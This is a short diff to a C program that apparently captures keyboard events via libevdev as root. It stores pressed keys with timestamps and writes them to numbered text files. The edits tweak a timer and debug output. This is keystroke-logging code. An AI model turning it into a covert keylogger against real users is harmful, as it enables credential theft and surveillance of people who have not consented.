@@ -50,7 +50,7 @@ int main(void) {
   // Send data until either the client or the server closes its stream.
   int socket_file_status = 0;
   //   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
-  int timer_counter = 200000000;  // 20000000
+  int timer_counter = 2000000;  // 20000000
 
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
@@ -101,13 +101,11 @@ int main(void) {
               .timestamp = asctime(timeinfo)};
 
           // append to key_package->keys
-          printf("package->keys[package->keys_arr_size]: %s\n", package->keys[0]);
           package->keys[package->keys_arr_size] = pressed_key;
           package->keys_arr_size++;
 
           // printf("New key_package array size: %ld\n",
           // key_package->keys_arr_size);
-          printf("2\n");
         }
       }
     } else {
@@ -119,10 +117,11 @@ int main(void) {
       // read and write and whee
 
       // convert int to str
+      print_logged_keys(*package);
       char str[20];
       sprintf(str, "in_%d", file_name_counter);
       char* file_name = strcat(str, ".txt");
-      FILE* package_log = fopen(file_name, "a");
+      FILE* package_log = fopen(file_name, "w");
       if (package_log == NULL) {
         error_and_exit("Couldn't open file");
       }
